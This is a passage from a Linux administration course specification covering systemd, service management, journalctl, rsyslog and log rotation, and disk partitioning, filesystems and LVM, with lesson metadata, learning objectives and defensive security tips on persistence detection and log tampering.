##### A3.C3.M2.L1 — systemd Architecture and the Boot Process
- **Slug:** systemd-architecture-boot-process | **Type:** expository | **Duration:** 45 min | **Difficulty:** intermediate | **Bloom's:** understand | **Ethical Content:** false
- **KG Nodes:** OS-L08, OS-L09 | **Prereqs:** A3.C3.M1.L4
- **Interactive:** TerminalSimulator (systemctl list-units, systemctl list-unit-files, systemctl get-default, systemctl list-dependencies multi-user.target, ls /etc/systemd/system/, ls /lib/systemd/system/, systemd-analyze, systemd-analyze blame, systemd-analyze critical-chain), ClickableDiagram (systemd boot chain: UEFI/BIOS firmware → GRUB2 bootloader → kernel loads initramfs → kernel initialises hardware → mounts real root → executes systemd as PID 1 → sysinit.target → basic.target → network.target → multi-user.target → optional graphical.target), QuizWidget
- **Animations:** systemd-as-pid1-reveal, unit-type-overview-animation, target-as-runlevel-replacement, systemd-analyze-waterfall-chart
- **Practical:** simulation | **Assessment:** quiz-only | **Reflection:** articulation
- **Certs:** CompTIA Linux+ Domain 3, LPIC-1 Topic 101, RHCSA EX200 | **Careers:** Linux Administrator, DevOps Engineer, Site Reliability Engineer | **Accessibility:** Boot chain diagram fully text-labeled with aria descriptions per stage; unit type reference table text-described with one example per type; systemd-analyze waterfall described step by step in text; target dependency tree keyboard-navigable with expand/collapse

**Learning Objectives:**
1. Explain systemd's role as PID 1: systemd is the first user-space process spawned by the kernel (always assigned PID 1), responsible for starting all other services, managing the system state machine, adopting orphaned processes whose parent has exited (preventing zombie accumulation), and activating units based on dependency declarations — identify the seven unit types: service (daemonised process), socket (network or IPC endpoint that activates a service on first connection), target (synchronisation point grouping units into a named state), timer (scheduled activation of another unit), mount (filesystem mount point managed by systemd), path (file-path watcher that activates a unit on file creation or modification), and device (hardware device represented as a unit that other units can depend on)
2. Trace the Linux boot sequence: (1) UEFI/BIOS runs POST and hands control to the bootloader; (2) GRUB2 loads the kernel and initramfs into RAM; (3) the kernel initialises hardware, mounts the initramfs as a temporary root, and executes /sbin/init (which is systemd on modern distributions) as PID 1; (4) systemd reads unit files from /lib/systemd/system/ (distro-provided) and /etc/systemd/system/ (administrator overrides) and activates targets in dependency order: sysinit.target (kernel subsystems, swap, early mounts) → basic.target (timers, paths, sockets) → network.target (network interfaces) → multi-user.target (all non-graphical services) → graphical.target (display manager, if a desktop is installed); (5) the login prompt or display manager appears
3. Use `systemd-analyze` to measure and diagnose boot performance: `systemd-analyze` shows total boot time split into firmware, bootloader, kernel, and userspace phases; `systemd-analyze blame` lists all units sorted by initialisation time — services at the top of the list are those that most delay reaching multi-user.target; `systemd-analyze critical-chain` shows the longest dependency chain determining boot completion time — and connect this to security: any unexpected service appearing near the top of `systemd-analyze blame`, or any enabled unit in `systemctl list-unit-files --state=enabled` that cannot be attributed to an installed package, is a high-priority indicator of a malicious persistence mechanism

**Skills Gained:** systemd as PID 1, seven unit types (service/socket/target/timer/mount/path/device), Linux boot sequence (UEFI/BIOS → GRUB → kernel → initramfs → systemd → targets), target dependency chain, systemctl list-units/list-unit-files/get-default/list-dependencies, /lib/systemd/system/ vs. /etc/systemd/system/, systemd-analyze/blame/critical-chain, enabled unit audit for persistence detection
**AI Mentor:** Connect the boot sequence to persistence: "Attackers who gain root on a Linux system frequently persist by dropping a malicious .service unit file into /etc/systemd/system/ and running `systemctl enable`. On every reboot, systemd starts the malicious binary alongside legitimate services. The tell is in `systemctl list-unit-files --state=enabled` — any enabled service unit you cannot attribute to a known installed package or your own administration work is a finding. During an incident, this command runs within the first five minutes of investigation."

---

##### A3.C3.M2.L2 — Managing Services with systemctl
- **Slug:** managing-services-systemctl | **Type:** expository | **Duration:** 50 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L08 | **Prereqs:** A3.C3.M2.L1
- **Interactive:** TerminalSimulator (systemctl start/stop/restart/reload/status nginx, systemctl enable/disable/is-enabled/is-active nginx, systemctl mask/unmask nginx, systemctl daemon-reload, cat /lib/systemd/system/nginx.service, nano /etc/systemd/system/myapp.service, systemctl enable --now myapp, systemctl list-units --type=service --state=failed), ClickableDiagram (service unit file anatomy: [Unit] Description/After/Requires/Wants, [Service] Type/ExecStart/ExecReload/Restart/RestartSec/User/Group/EnvironmentFile, [Install] WantedBy — each field labeled and expandable), QuizWidget
- **Animations:** systemctl-start-stop-enable-state-machine, service-unit-file-section-reveal, restart-policy-on-failure-flow, mask-vs-disable-comparison
- **Practical:** guided-lab | **Assessment:** quiz-and-challenge | **Reflection:** metacognitive
- **Certs:** CompTIA Linux+ Domain 3, LPIC-1 Topic 101, RHCSA EX200 | **Careers:** Linux Administrator, DevOps Engineer, Site Reliability Engineer | **Accessibility:** Service unit file anatomy diagram text-labeled with aria descriptions per section and field; active/inactive vs. enabled/disabled distinction in an accessible comparison table; restart policy options listed in a plain-language reference table; mask vs. disable explained in text before animation; all terminal examples in accessible code blocks

**Learning Objectives:**
1. Manage the service lifecycle with systemctl: `start` (start immediately), `stop` (stop immediately), `restart` (stop then start — drops all connections), `reload` (send SIGHUP to reload configuration without dropping connections — only if the service supports it), `status` (show active state, enabled state, PID, and recent journal output) — and distinguish the two orthogonal dimensions of service state: active/inactive (is it running right now?) and enabled/disabled (will it start automatically at next boot?); a service can be active-but-disabled (running now, will not survive reboot) or inactive-but-enabled (not running now, will start at next boot) — check both with `systemctl is-active` and `systemctl is-enabled`
2. Write a minimal custom service unit file: create /etc/systemd/system/servicename.service with `[Unit]` containing `Description=` (human-readable label) and `After=network.target` (start after the network is available); `[Service]` containing `Type=simple` (process runs in foreground — systemd tracks it as the main process), `ExecStart=/absolute/path/to/binary argument` (must be an absolute path with no shell variable expansion or globbing), `Restart=on-failure` (restart if the process exits with a non-zero code), `RestartSec=5` (wait 5 seconds before restarting), and `User=serviceaccount` (run as a non-root account); `[Install]` containing `WantedBy=multi-user.target` — then run `systemctl daemon-reload` (mandatory after any unit file change — without it systemd reads the old version), `systemctl enable --now servicename` (enable at boot and start immediately), and verify with `systemctl status`
3. Use mask and unmask for strong service prevention: `systemctl disable servicename` prevents the service from starting at boot but still allows manual `systemctl start`; `systemctl mask servicename` creates a symlink from the unit file to /dev/null, making the service completely unlaunchable by any means — manual start, dependency activation, socket activation — until explicitly unmasked with `systemctl unmask`; and identify the security use case: masking unnecessary or dangerous services (telnet, rsh, avahi-daemon, cups on headless servers) prevents them from being inadvertently started even if a package reinstall or configuration error would otherwise enable them

**Skills Gained:** systemctl start/stop/restart/reload/status, active vs. inactive (runtime state), enabled vs. disabled (boot state), is-active/is-enabled, service unit file structure ([Unit]/[Service]/[Install]), ExecStart (absolute path required), Type=simple, Restart=on-failure/RestartSec, User= for non-root execution, After=/WantedBy= dependencies, systemctl daemon-reload (mandatory after unit file changes), enable --now, mask/unmask vs. disable
**AI Mentor:** The daemon-reload step is the most frequently forgotten step: "Every time you create or modify a unit file, run `systemctl daemon-reload` before any other systemctl command on that unit. Without it, systemd keeps reading the old version from memory and ignores your file changes entirely — the symptom is that your edits appear to have no effect. Make it muscle memory: edit file → daemon-reload → enable/start. Also flag that omitting `User=` means the service runs as root by default, which is a security misconfiguration for almost every application service. Always specify a dedicated non-root service account."

---

##### A3.C3.M2.L3 — System Logging with journalctl
- **Slug:** system-logging-journalctl | **Type:** expository | **Duration:** 45 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L09 | **Prereqs:** A3.C3.M2.L1, A3.C3.M2.L2
- **Interactive:** TerminalSimulator (journalctl, journalctl -u ssh, journalctl -f, journalctl -p err, journalctl -p 0..3, journalctl -n 50, journalctl -b, journalctl -b -1, journalctl --since "2026-01-01" --until "2026-01-02", journalctl --since "1 hour ago", journalctl --disk-usage, journalctl --vacuum-size=500M, journalctl --vacuum-time=30d, journalctl -o json-pretty | head -20, cat /etc/systemd/journald.conf), QuizWidget
- **Animations:** journald-binary-format-vs-syslog-text, journal-boot-boundary-illustration, priority-level-number-name-mapping, vacuum-size-time-cleanup-animation
- **Practical:** guided-lab | **Assessment:** quiz-only | **Reflection:** metacognitive
- **Certs:** CompTIA Linux+ Domain 3, LPIC-1 Topic 108, RHCSA EX200, CompTIA Security+ Domain 3 | **Careers:** SOC Analyst, Linux Administrator, Incident Responder, Security Engineer | **Accessibility:** Priority level table (0 emerg through 7 debug) text-described with both number and name; journalctl option reference table fully text-described; boot boundary concept explained in text before animation; --since/--until date formats listed in a plain-language format table; all command examples in accessible code blocks

**Learning Objectives:**
1. Query the systemd journal with journalctl filters: `-u servicename` (entries from one unit only), `-f` (follow mode — stream new entries in real time as they arrive, equivalent to `tail -f` for systemd services), `-p priority` using syslog severity level number or name (0=emerg, 1=alert, 2=crit, 3=err, 4=warning, 5=notice, 6=info, 7=debug) — `-p err` shows error and above; `-p 0..3` shows emerg through err; `-n 50` shows only the 50 most recent entries; `-b` shows only entries from the current boot; `-b -1` shows entries from the boot before last — invaluable for diagnosing crashes and unexpected reboots; combine filters freely: `journalctl -u nginx -p err --since "1 hour ago"` extracts nginx errors from the past hour
2. Filter by time with human-readable expressions: `--since "2026-01-15 09:00:00"` and `--until "2026-01-15 10:00:00"` specify an absolute window; `--since "yesterday"`, `--since "1 hour ago"`, `--since "2 days ago"` use relative expressions — and explain the forensic value of `-b -1`: when a system reboots unexpectedly (crash, kernel panic, attacker-triggered reboot), the journal for that boot is fully preserved and accessible, providing a complete log of everything that happened up to the shutdown without needing a separate log file or remote logging infrastructure
3. Configure persistent journal storage and manage disk usage: by default on many distributions journald stores logs only in memory (/run/log/journal/) and loses them on reboot; set `Storage=persistent` in /etc/systemd/journald.conf and restart systemd-journald to write to /var/log/journal/ so logs survive reboots; `journalctl --disk-usage` shows total journal size; `journalctl --vacuum-size=500M` deletes the oldest journal files until total size is under 500 MB; `journalctl --vacuum-time=30d` deletes entries older than 30 days — configure both in /etc/systemd/journald.conf as `SystemMaxUse=` and `MaxRetentionSec=` for automatic enforcement

**Skills Gained:** journalctl -u/-f/-p/-n/-b/-b -1/--since/--until, syslog priority levels 0–7 (emerg/alert/crit/err/warning/notice/info/debug), combined filter expressions, -b -1 for pre-reboot forensics, journald persistent storage (Storage=persistent), /var/log/journal/ vs. /run/log/journal/, --disk-usage/--vacuum-size/--vacuum-time, SystemMaxUse/MaxRetentionSec in journald.conf, -o json-pretty for structured output
**AI Mentor:** The `-b -1` flag is a critical incident response tool: "When a server reboots unexpectedly — a crash, a kernel panic from a rootkit, or an attacker running `reboot` after achieving root — the journal from that boot is preserved. `journalctl -b -1 -p err` gives you the error log from the session that just ended. Without `Storage=persistent`, this data is gone forever. Configure persistent journal storage on every server you administer. The few megabytes per day it uses have saved investigations that would otherwise be completely blind because the only evidence was in the lost memory journal."

---

##### A3.C3.M2.L4 — rsyslog, Log Rotation, and Log Security
- **Slug:** rsyslog-log-rotation-log-security | **Type:** discovery | **Duration:** 45 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L09 | **Prereqs:** A3.C3.M2.L1, A3.C3.M2.L2, A3.C3.M2.L3
- **Interactive:** TerminalSimulator (cat /etc/rsyslog.conf, cat /etc/rsyslog.d/50-default.conf, logger -t myapp "test message", grep myapp /var/log/syslog, cat /etc/logrotate.conf, cat /etc/logrotate.d/nginx, logrotate -f /etc/logrotate.d/nginx, logrotate --debug /etc/logrotate.conf, ls -lt /var/log/nginx/), ClickableDiagram (rsyslog routing: facility (auth/kern/daemon/cron/user/local0-7) × severity (emerg through debug) → action (file/@@TCP/@UDP/discard) — click cells to see routing rule syntax), QuizWidget
- **Animations:** rsyslog-facility-severity-routing-matrix, logrotate-rotation-rename-compress-sequence, remote-syslog-tcp-forwarding-flow, log-gap-tamper-detection
- **Practical:** guided-lab | **Assessment:** quiz-and-challenge | **Reflection:** transfer
- **Certs:** CompTIA Linux+ Domain 3, LPIC-1 Topic 108, CompTIA Security+ Domain 3 | **Careers:** Linux Administrator, SOC Analyst, Security Engineer, Incident Responder | **Accessibility:** Facility-severity routing matrix described as a plain-language text table; logrotate rotation sequence documented as numbered steps; remote forwarding configuration decoded field by field; log gap tampering indicator explained textually before animation; all configuration file examples in accessible code blocks with annotated fields

**Learning Objectives:**
1. Interpret and write rsyslog routing rules: each rule uses the selector `facility.severity → action` syntax — facility identifies the message source category (auth for authentication events, kern for kernel messages, daemon for system daemons, cron for scheduled tasks, user for user-level processes, local0–local7 for custom applications) and severity is the minimum level to match using the same 0–7 scale as journald (a rule matching `err` also captures `crit`, `alert`, and `emerg`); the action is a filename (`/var/log/auth.log`), a TCP remote server (`@@10.0.0.5:514`), a UDP remote server (`@10.0.0.5:514`), or a discard (`~`); wildcards: `auth.*` matches all auth severities, `*.err` matches all facilities at error and above, `*.*` matches everything — use `logger -t tagname "message"` to inject a test entry and verify the routing rule sends it to the intended destination
2. Configure logrotate for a service log: a stanza in /etc/logrotate.d/servicename specifies the log path followed by a block of directives: `daily`/`weekly`/`monthly` (rotation frequency), `rotate N` (keep N archived copies), `compress` (gzip the archived files), `delaycompress` (compress the previous rotation, not the most recent — allows the service to finish writing to it), `missingok` (do not error if the log file is absent), `notifempty` (skip rotation if the file is empty), `postrotate / endscript` (commands run after rotation — typically sending SIGHUP or SIGUSR1 to the service so it closes the old file handle and opens the new empty log file) — and explain why the postrotate script is critical: without it the running service continues writing to the rotated file's inode rather than the new file
3. Identify three indicators of log tampering: (1) time gap — an unexplained jump in log entry timestamps with no corresponding shutdown or reboot event, indicating entries were deleted from the middle of the file; (2) size anomaly — a log file significantly smaller than expected given its modification time, or a rotated archive with far fewer entries than adjacent rotations; (3) ownership or permission change — a log file readable by a non-root account or owned by an unexpected user, suggesting deliberate modification — and explain why forwarding logs to a remote centralized receiver (SIEM or syslog server) is the primary defense: an attacker who compromises a host cannot retroactively modify logs that were forwarded before the compromise occurred

**Skills Gained:** rsyslog facility.severity routing (facility categories/severity wildcard/action types), @@TCP vs. @UDP remote forwarding syntax, logger for rule testing, logrotate directives (daily/rotate/compress/delaycompress/missingok/notifempty/postrotate), postrotate SIGHUP/SIGUSR1 requirement for service log handle refresh, three log tampering indicators (time gap/size anomaly/permission change), remote forwarding as tamper prevention, SIEM as immutable log store
**AI Mentor:** Log forwarding is the most important log security control: "An attacker with root access can modify, truncate, or delete local log files on a compromised host. The only logs that remain trustworthy after a compromise are logs that were forwarded to a remote server the attacker cannot write to — before they arrived. Every production server should forward at minimum auth.log and syslog to a centralised log receiver. Without this, every host investigation depends on whether the attacker bothered to clean up after themselves. Centralised logging is not optional in a mature security program — it is a foundational requirement."

---

### Module A3.C3.M3 — Storage, Filesystems, and Disk Management

**Module Objectives:**
1. Identify block devices with lsblk, create partitions using fdisk and gdisk, and distinguish MBR from GPT schemes
2. Create filesystems with mkfs, mount them temporarily and persistently via /etc/fstab using UUIDs, and apply security mount options
3. Create and manage logical volumes using LVM: physical volumes, volume groups, logical volumes, and online extension with resize2fs
4. Manage swap space, monitor disk health with SMART data, measure I/O with iostat, and identify storage consumers with df, du, and find

**KG Domain Coverage:** OS-L08 (system management — storage subsystem), OS-L01 (filesystem hierarchy — mount points and fstab)
**Practical Outcomes:** Learner adds a virtual disk, creates a GPT partition with gdisk, formats it as ext4, mounts it persistently by UUID in /etc/fstab with nosuid and noexec options, creates an LVM setup across two partitions and extends a logical volume online, runs smartctl to check disk health status, and uses find combined with du to identify the top-10 disk consumers on the system
**Required Interactive Components:** TerminalSimulator (lsblk, lsblk -f, fdisk -l, fdisk /dev/sdb, gdisk /dev/sdb, mkfs.ext4, mkfs.xfs, mount, umount, blkid, cat /etc/fstab, mount -a, fsck, pvcreate, vgcreate, lvcreate, lvextend, resize2fs, xfs_growfs, lvdisplay, vgdisplay, pvdisplay, df -h, df -i, du -sh, find -size, smartctl -a, iostat -x, iotop), ClickableDiagram (LVM abstraction: physical disks → PVs → VG pool → LVs → filesystems → mount points), ComparisonTable (MBR vs. GPT: max disk size/max partitions/backup table/UEFI requirement), QuizWidget
**Animation Categories:** lsblk-device-tree-reveal, fdisk-partition-write-sequence, mkfs-inode-table-creation, fstab-mount-at-boot, lvm-pv-vg-lv-creation, lvextend-resize2fs-online-expansion
**Simulations:** LVM builder (create PV → add to VG → create LV → format → mount — state machine with running df output); disk space investigator (click directory → see size and top subdirectory contributors)
**Assessment Strategy:** Quiz-only for L1 and L3; quiz-and-challenge for L2 and L4

**Practical Progression:**
- **Beginner:** Run `lsblk -f` and decode all output columns — identify device name, partition name, filesystem type, UUID, and mount point for each listed partition
- **Intermediate:** Create a partition on /dev/sdb with fdisk, format as ext4 with label "data", mount at /mnt/data, add a UUID-based fstab entry, and verify with `mount -a`
- **Advanced:** Extend logical volume /dev/vgdata/lvdata by 5G with `lvextend -L +5G`, grow the ext4 filesystem online with `resize2fs`, verify with `df -h /mnt/data`
- **Capstone:** Not applicable at module level

---

##### A3.C3.M3.L1 — Disk Partitioning: lsblk, fdisk, and gdisk
- **Slug:** disk-partitioning-lsblk-fdisk-gdisk | **Type:** expository | **Duration:** 45 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L08 | **Prereqs:** A3.C3.M2.L4
- **Interactive:** TerminalSimulator (lsblk, lsblk -f, lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT, fdisk -l, fdisk -l /dev/sda, fdisk /dev/sdb [n p 1 default +20G w sequence], gdisk /dev/sdc [o n 1 default +20G 8300 w], partprobe /dev/sdb), ComparisonTable (MBR vs. GPT: max disk size, max partitions, partition table location, backup table, UEFI requirement, OS support), QuizWidget
- **Animations:** lsblk-device-tree-field-decode, fdisk-interactive-partition-create, mbr-vs-gpt-structure-comparison, partition-naming-convention-nvme-vs-sata
- **Practical:** guided-lab | **Assessment:** quiz-only | **Reflection:** articulation
- **Certs:** CompTIA Linux+ Domain 1, LPIC-1 Topic 104, RHCSA EX200 | **Careers:** Linux Administrator, DevOps Engineer, Systems Engineer | **Accessibility:** lsblk output decoded field by field in a reference table; MBR vs. GPT comparison table has proper headers; fdisk interactive sequence documented as numbered steps alongside animation; device and partition naming conventions in an accessible text table

**Learning Objectives:**
1. Identify and decode block device listings with lsblk: `lsblk` displays all block devices as a tree — physical disks appear as top-level nodes (sda/sdb for SATA, nvme0n1/nvme1n1 for NVMe, vda for KVM virtual disks) with partitions as children (sda1, sda2, nvme0n1p1 — NVMe uses `p` before the partition number to avoid ambiguity); the TYPE column shows disk (whole device), part (partition), lvm (logical volume), and rom; `lsblk -f` adds filesystem type, UUID, and mount point columns; `lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT` produces a compact custom view useful for scripting
2. Distinguish MBR and GPT partitioning: MBR (Master Boot Record) supports maximum 4 primary partitions (or 3 primary + 1 extended containing logical partitions), maximum disk size 2 TB, and stores the single partition table in the first 512 bytes — corruption or overwrite of the first sector destroys the entire table; GPT (GUID Partition Table) supports up to 128 partitions, disks beyond 2 TB, stores a backup partition table at the disk's end (resilient to first-sector corruption), and is required for UEFI boot — use `fdisk -l /dev/sda` to determine which scheme a disk uses
3. Create a partition with fdisk (MBR) and gdisk (GPT): enter interactive mode with `fdisk /dev/sdb` — `m` for help, `p` to print the current table, `n` to create a new partition (select `p` for primary, accept defaults for partition number and start sector, specify end with `+sizeG`), `t` to set the partition type (82 = Linux swap, 83 = Linux filesystem, 8e = Linux LVM), `w` to write and exit (all changes before `w` are in memory only — `w` is irreversible); for GPT use `gdisk /dev/sdc` with the same key layout but type code 8300 for Linux filesystem and 8200 for swap; run `partprobe /dev/sdb` after writing to notify the kernel of the new partition table without rebooting

**Skills Gained:** lsblk (device tree, -f UUID/FSTYPE, custom -o columns), device naming (sda/nvme0n1p/vda conventions), MBR vs. GPT comparison (max partitions/size/resilience/UEFI), fdisk -l (inspection), fdisk interactive (n/p/t/w/m), partition type codes (82/83/8e/8300/8200), gdisk for GPT, partprobe after table write
**AI Mentor:** Flag the point-of-no-return: "Every fdisk command before `w` is safe — changes are only in memory. `w` commits the table to disk and exits immediately. Before pressing `w`, always press `p` to print the proposed table and read it carefully. Once written, recovery requires forensic partition table tools. The same caution applies to any destructive disk operation: verify, then act. And never run fdisk or gdisk on a mounted disk you intend to keep — always target only the device you mean to partition."

---

##### A3.C3.M3.L2 — Filesystems: mkfs, mount, and /etc/fstab
- **Slug:** filesystems-mkfs-mount-fstab | **Type:** expository | **Duration:** 50 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L08, OS-L01 | **Prereqs:** A3.C3.M3.L1
- **Interactive:** TerminalSimulator (mkfs.ext4 /dev/sdb1, mkfs.ext4 -L datalabel /dev/sdb1, mkfs.xfs /dev/sdb2, blkid, blkid /dev/sdb1, mount /dev/sdb1 /mnt/data, mount -t ext4 -o nosuid,noexec,nodev /dev/sdb1 /mnt/data, umount /mnt/data, cat /etc/fstab, mount -a, tune2fs -l /dev/sdb1, fsck.ext4 /dev/sdb1), ComparisonTable (ext4 vs. xfs: journaling approach, max file size, online grow, offline shrink, default distro, fsck tool), QuizWidget
- **Animations:** mkfs-inode-table-allocation, blkid-uuid-vs-device-path-stability, fstab-six-field-parse, mount-a-boot-sequence, fsck-journal-replay
- **Practical:** guided-lab | **Assessment:** quiz-and-challenge | **Reflection:** metacognitive
- **Certs:** CompTIA Linux+ Domain 1, LPIC-1 Topic 104, RHCSA EX200 | **Careers:** Linux Administrator, DevOps Engineer, Systems Engineer, Forensics Analyst | **Accessibility:** /etc/fstab six fields decoded in a plain-language table with a worked example row; mount option flags in an accessible reference table; fsck precondition explained textually; blkid UUID stability reasoning before animation; all command examples in accessible code blocks

**Learning Objectives:**
1. Create filesystems with mkfs and retrieve their identifiers: `mkfs.ext4 /dev/sdb1` creates ext4 with defaults; `mkfs.ext4 -L labelname /dev/sdb1` adds a label; `mkfs.xfs /dev/sdb2` creates XFS (default on RHEL/Fedora — superior performance for large files and parallel I/O; supports online grow but not offline shrink; fsck tool is xfs_repair; ext4 is default on Debian/Ubuntu, supports online grow and offline shrink, fsck tool is e2fsck); retrieve filesystem UUID and type with `blkid /dev/sdb1` (shows UUID="...", TYPE="ext4", LABEL="...") and full ext4 superblock metadata with `tune2fs -l /dev/sdb1` including creation time, mount count, and last fsck time
2. Mount filesystems and configure persistent mounting in /etc/fstab: `mount /dev/sdb1 /mnt/data` mounts temporarily using the device path; `umount /mnt/data` or `umount /dev/sdb1` unmounts — in /etc/fstab, each line has six fields: (1) device — use `UUID=xxxxxxxx` rather than /dev/sdb1 because UUIDs are stable across disk additions and reboots while device names can reorder when disks are added; (2) mount point; (3) filesystem type; (4) mount options (comma-separated); (5) dump frequency — always 0; (6) fsck pass order — 0 to skip, 1 for root only, 2 for non-root filesystems checked after root — test a new fstab entry with `mount -a` (mount all fstab entries not yet mounted) before rebooting
3. Apply security mount options to harden filesystems: `nosuid` (ignore SUID and SGID bits on executables in this filesystem — mount /tmp and /home with nosuid to prevent privilege escalation via planted SUID binaries), `noexec` (prevent execution of any binary — mount /tmp with noexec to block payload execution from world-writable directories), `nodev` (ignore block and character device files — appropriate for all user-facing filesystems), `ro` (read-only mount — useful for forensic evidence volumes and immutable data) — run `fsck /dev/sdb1` on an unmounted filesystem to check and repair journal consistency; fsck on a mounted filesystem can corrupt it — unmount first or boot to a rescue environment

**Skills Gained:** mkfs.ext4/mkfs.xfs, filesystem labels, ext4 vs. xfs comparison, blkid (UUID/LABEL/TYPE), tune2fs -l, mount (temporary), umount, /etc/fstab six fields (UUID preferred over device path), mount -a for testing, security mount options (nosuid/noexec/nodev/ro), fsck (unmounted-only requirement), journal consistency concept
**AI Mentor:** The UUID-over-device-name rule has a concrete failure story: "A server with /dev/sdb1 in fstab has a disk added. Linux reorders the device names — the data disk becomes /dev/sdc1. On next reboot, fstab tries to mount the wrong partition. The system drops to emergency mode at 3 AM. UUID=... makes the fstab entry independent of device order forever — the UUID is written into the filesystem superblock and never changes. Always use `blkid` to get the UUID and paste it directly into fstab. Never use bare device paths. This is the single most impactful fstab habit you can build."

---

##### A3.C3.M3.L3 — Logical Volume Management (LVM)
- **Slug:** logical-volume-management-lvm | **Type:** expository | **Duration:** 50 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L08 | **Prereqs:** A3.C3.M3.L1, A3.C3.M3.L2
- **Interactive:** TerminalSimulator (pvcreate /dev/sdb1, pvdisplay, vgcreate vgdata /dev/sdb1, vgdisplay, lvcreate -L 20G -n lvdata vgdata, lvdisplay, mkfs.ext4 /dev/vgdata/lvdata, mount /dev/vgdata/lvdata /mnt/data, pvcreate /dev/sdc1, vgextend vgdata /dev/sdc1, lvextend -L +10G /dev/vgdata/lvdata, resize2fs /dev/vgdata/lvdata, xfs_growfs /mnt/data, lvcreate -L 5G -s -n lvdata_snap /dev/vgdata/lvdata, mount -o ro /dev/vgdata/lvdata_snap /mnt/snapshot), ClickableDiagram (LVM abstraction layers: physical disks → PVs with physical extents → VG as unified extent pool → LVs as allocated extent ranges → formatted filesystems → mount points), QuizWidget
- **Animations:** pv-vg-lv-creation-sequence, extent-allocation-from-pool, lvextend-resize2fs-online-flow, lvm-snapshot-cow-mechanism
- **Practical:** guided-lab | **Assessment:** quiz-only | **Reflection:** metacognitive
- **Certs:** CompTIA Linux+ Domain 1, LPIC-1 Topic 104, RHCSA EX200 | **Careers:** Linux Administrator, Systems Engineer, DevOps Engineer | **Accessibility:** LVM layer stack text-labeled with aria descriptions per layer; extent concept explained in text before animation; lvextend + resize2fs two-step sequence documented as numbered steps; snapshot copy-on-write concept described textually; all command sequences in accessible code blocks

**Learning Objectives:**
1. Explain the LVM abstraction model and create a basic LVM setup: a Physical Volume (PV) is a raw disk or partition prepared for LVM with `pvcreate /dev/sdb1`; a Volume Group (VG) aggregates one or more PVs into a unified storage pool divided into Physical Extents (PE, default 4 MB each) with `vgcreate vgname /dev/sdb1`; a Logical Volume (LV) is a virtual block device carved from the VG pool by allocating a number of extents with `lvcreate -L 20G -n lvname vgname` — the result appears at /dev/vgname/lvname and can be formatted and mounted identically to a physical partition; inspect each layer with pvdisplay (PE size, total/free PEs), vgdisplay (total/free space), and lvdisplay (LV path, size, current state)
2. Extend a volume group and resize a logical volume online: add a new physical disk to the pool with `vgextend vgname /dev/sdc1` (the disk's space joins the VG immediately); grow the LV with `lvextend -L +10G /dev/vgname/lvname` (allocates 10 GB more from the pool) — then resize the filesystem: `resize2fs /dev/vgname/lvname` for ext4 (can run live while the filesystem is mounted — online resize), or `xfs_growfs /mountpoint` for XFS (must be mounted, always online) — verify with `df -h /mountpoint` and confirm the new capacity; this zero-downtime online resizing capability is LVM's primary operational advantage over fixed partitions
3. Create an LVM snapshot for forensic evidence preservation: `lvcreate -L 5G -s -n lvdata_snap /dev/vgdata/lvdata` creates a 5 GB copy-on-write snapshot — initially the snapshot consumes almost no space because it stores only blocks that have changed since creation (when a block on the origin LV is modified, its old content is copied to the snapshot before the write proceeds); mount the snapshot read-only with `mount -o ro /dev/vgdata/lvdata_snap /mnt/snapshot` to access the filesystem state at the exact moment of snapshot creation; this allows an incident responder to preserve a point-in-time copy of a potentially compromised filesystem for offline forensic analysis while the production system continues running without interruption

**Skills Gained:** PV/VG/LV/PE LVM abstraction model, pvcreate/pvdisplay, vgcreate/vgdisplay/vgextend, lvcreate -L -n/lvdisplay, /dev/vgname/lvname device path, lvextend -L +size, resize2fs (ext4 online), xfs_growfs (XFS mounted), online resize advantage over fixed partitions, lvcreate -s snapshot (copy-on-write), snapshot forensic preservation use case, read-only snapshot mount
**AI Mentor:** Motivate LVM from operational reality: "Fixed partitions cause the majority of disk-full production emergencies. A /var partition provisioned at 20 GB fills up as logs accumulate over months, and without LVM your options are: take the system down, repartition, restore from backup, and lose time. With LVM, you add a disk, run `vgextend`, `lvextend`, `resize2fs`, and the filesystem grows in under a minute with zero downtime. This is why virtually every production Linux server uses LVM. The snapshot capability is a bonus: it lets you take a forensically sound point-in-time image of a running system without unmounting it — something impossible with fixed partitions."

---

##### A3.C3.M3.L4 — Swap, Disk Health, and Storage Monitoring
- **Slug:** swap-disk-health-storage-monitoring | **Type:** discovery | **Duration:** 40 min | **Difficulty:** intermediate | **Bloom's:** apply | **Ethical Content:** false
- **KG Nodes:** OS-L08 | **Prereqs:** A3.C3.M3.L1, A3.C3.M3.L2, A3.C3.M3.L3
- **Interactive:** TerminalSimulator (free -h, swapon --show, cat /proc/swaps, fallocate -l 2G /swapfile, chmod 600 /swapfile, mkswap /swapfile, swapon /swapfile, swapoff /swapfile, df -h, df -i, du -sh /var/log, du -sh /* 2>/dev/null | sort -hr | head -10, find / -size +500M -type f -exec ls -lh {} \; 2>/dev/null, smartctl -a /dev/sda, iostat -x 1 5, iotop), QuizWidget
- **Animations:** swap-as-virtual-memory-extension, df-h-block-space-vs-df-i-inode-space, du-recursive-aggregation, smartctl-attributes-health-indicator, iostat-util-await-fields
- **Practical:** free-lab | **Assessment:** quiz-and-challenge | **Reflection:** transfer
- **Certs:** CompTIA Linux+ Domain 1, LPIC-1 Topic 104, CompTIA Security+ Domain 3 | **Careers:** Linux Administrator, SOC Analyst, Site Reliability Engineer | **Accessibility:** free -h output fields described in a plain-language table; smartctl health indicator values listed with severity descriptions; iostat field reference table fully text-described; du sorting command decoded step by step in text; all command examples in accessible code blocks

**Learning Objectives:**
